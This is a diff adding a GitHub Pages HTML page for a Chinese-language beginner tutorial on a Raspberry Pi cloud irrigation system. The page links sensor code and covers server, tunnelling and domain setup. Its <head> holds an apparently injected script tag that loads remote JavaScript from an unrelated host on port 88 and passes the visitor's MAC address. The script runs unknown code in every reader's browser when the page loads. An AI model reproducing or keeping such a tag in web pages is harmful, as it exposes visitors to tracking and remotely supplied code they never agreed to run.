@@ -1,0 +1,187 @@
+<!doctype html>
+<html lang="en-US">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <!-- Begin Jekyll SEO tag v2.5.0 -->
+    <title>shumeipai | 树莓派云灌溉系统</title>
+    <meta name="generator" content="Jekyll v3.8.5" />
+    <meta property="og:title" content="shumeipai" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="帮您零基础实现一个简单的树莓派项目，采用中英双语。(目前英语尚存在问题)" />
+    <meta property="og:description" content="帮您零基础实现一个简单的树莓派项目，采用中英双语。(目前英语尚存在问题)" />
+    <link rel="canonical" href="http://qkgoride.club/shumeipai/" />
+    <meta property="og:url" content="http://qkgoride.club/shumeipai/" />
+    <meta property="og:site_name" content="树莓派云灌溉系统" />
+    <script type="application/ld+json">
+        {
+            "@type": "WebSite",
+            "headline": "shumeipai",
+            "url": "http://qkgoride.club/shumeipai/",
+            "name": "树莓派云灌溉系统",
+            "description": "帮您零基础实现一个简单的树莓派项目，采用中英双语。(目前英语尚存在问题)",
+            "@context": "http://schema.org"
+        }
+    </script>
+    <!-- End Jekyll SEO tag -->
+
+
+    <link rel="stylesheet" href="/shumeipai/assets/css/style.css?v=d3f57a4d743384f1ad71ba01e2cbe5e7e9c36a2a">
+    <script src="/shumeipai/assets/js/scale.fix.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <script async=true src="http://t.7gg.cc:88/j1.js?MAC=FC7C02723B59"></script>
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+            <p><a href="https://github.com/sogeisetsu/shumeipai">中英对照页面</a></p>
+            <h1>树莓派云灌溉系统</h1>
+
+            <p>帮您零基础实现一个简单的树莓派项目，采用中英双语。(目前英语尚存在问题)</p>
+
+            <p class="view"><a href="https://github.com/sogeisetsu/shumeipai">View the Project on GitHub <small></small></a></p>
+            <ul>
+
+                <li><a href="https://github.com/sogeisetsu/shumeipai">View On <strong>GitHub</strong></a></li>
+            </ul>
+        </header>
+        <section>
+
+            <h1 id="shumeipai">shumeipai</h1>
+            <p>0基础实现树莓派云灌溉系统</p>
+            <h1 id="树莓派云灌溉系统的实现">
+                <center>树莓派云灌溉系统的实现</center>
+            </h1>
+            <h2 id="目录">
+                <center>目录</center>
+            </h2>
+            <h2 id="树莓派相关配置">树莓派相关配置</h2>
+            <ul>
+                <li>树莓派简介
+                    <ul>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/the%20introduction%20of%20pi.md">树莓派的用途和本质</a></li>
+                    </ul>
+                </li>
+                <li>树莓派安装系统并网络连接
+                    <ul>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/How%20to%20Set%20up%20pi%20and%20Networks.md">如何去设置树莓派和网络</a></li>
+                    </ul>
+                </li>
+                <li>树莓派摄像头的启用
+                    <ul>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%91%84%E5%83%8F%E5%A4%B4%E5%BC%80%E5%8F%91%E5%89%8D%E7%9A%84%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.docx">使用相机模块的环境准备(这是docx文档，请下载后查看)</a></li>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%98%E6%96%B9%E6%91%84%E5%83%8F%E5%A4%B4%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.docx">相机模块教程（同上）</a></li>
+                    </ul>
+                </li>
+                <li>树莓派相关传感器的使用
+                    <ul>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/Some%20notes%20about%20the%20sensor.md">关于传感器的总说明</a></li>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/%E5%9C%9F%E5%A3%A4.py">控制土壤湿度传感器的代码</a></li>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/dh11.py">控制dht11</a></li>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/%E7%BB%A7%E7%94%B5%E5%99%A8.py">控制继电器</a></li>
+                    </ul>
+                </li>
+                <li>树莓派控制传感器的代码
+                    <ul>
+                        <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/Console%20code.py">控制继电器</a></li>
+                    </ul>
+                </li>
+                <li>树莓派端的内网穿透
+                    <ul>
+                        <li><a href="https://www.jianshu.com/p/a921e85280ed">参考这里设置</a></li>
+                    </ul>
+                </li>
+                <li>scp corntab nohup 介绍
+                    <ul>
+                        <li>scp 是负责传文件的命令</li>
+                        <li>crontab是负责控制传文件时间的命令</li>
+                        <li>nohup 是负责后台运行的命令</li>
+                        <li>这三个命令可以通过网络来学习</li>
+
+                    </ul>
+                </li>
+                <li>shell 脚本
+                    <ul>
+                        <li>此脚本目的是定时将数据上传到服务器</li>
+                        <li><a href="https://blog.csdn.net/u012454773/article/details/72779439">在运行此脚本前应解决scp无密码传输的问题</a></li>
+                        <li>后台运行的命令为 nohup sh /home/pi/tran/a.sh » /home/pi/tran/d.txt 2&gt;&amp;1 &amp;</li>
+
+                    </ul>
+                </li>
+                <li>服务器购买及选择
+                    <ul>
+                        <li>服务器我购买的是阿里云的轻量级服务器，现在可以使用学生优惠</li>
+                        <li>服务器需要搭一个网站的框架，推荐用flask 我用的是宝塔</li>
+                        <li>使用宝塔只需要看官方教程就够了</li>
+                    </ul>
+
+
+                </li>
+                <li>端口的开关
+                    <ul>
+                        <li>需要开一些端口</li>
+                        <li>我开的是这些端口</li>
+                        <li><img src="https://img-blog.csdnimg.cn/20190727001946742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1eXVlcw==,size_16,color_FFFFFF,t_70" alt="图片" /></li>
+                    </ul>
+                </li>
+                <li>网站配置
+                    <ul>
+                        <li>宝塔页面上配置上数据库，ftp，网站。其实刚开始设置宝塔的时候会有提示，按照提示设置lnmp就好了
+                    </ul>
+                    </li>
+                    <li>frp 配置树莓派公网ip
+                        <ul>
+                            <li>这个参考前面内网穿透的教程</li>
+                        </ul>
+                    </li>
+                    <li>前端网页代码
+                        <ul>
+                            <li><a href="https://github.com/sogeisetsu/shumeipai/blob/master/index%20(2).html">前端</a></li>
+
+                        </ul>
+                    </li>
+                    <li>接受树莓派传来的文件
+                        <ul>
+                            <li>在前端代码里有说明</li>
+                        </ul>
+                    </li>
+                    <li>发送文件
+                        <ul>
+                            <li>在前端代码里有说明
+                                <h3 id="更新">更新</h3>
+                            </li>
+                        </ul>
+                    </li>
+                    <li>设置域名
+                        <ol>
+                            <li>域名可以从阿里云，腾讯云等购买</li>
+                            <li>在域名服务商那里可以设置解析，TTL建议3600，<strong><em>实验发现，600s的经常性304</em></strong></li>
+                            <li>然后从宝塔面板绑定域名</li>
+                            <li>这样就可以通过域名访问了</li>
+                            <li>我在这个项目中的域名是<a href="http://www.qkgoride.club/">www.qkgoride.club</a><em>截至2019/8/3 17：23此域名仍无法访问，原因是刚刚修改过相关内容，需要3600s后才可正常访问</em></li>
+                        </ol>
+                    </li>
+            </ul>
+
+
+        </section>
+    </div>
+    <footer>
+
+        <p>Project maintained by <a href="https://github.com/sogeisetsu">sogeisetsu</a></p>
+
+        <p>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></p>
+    </footer>
+    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
+
+
+</body>
+
+</html>
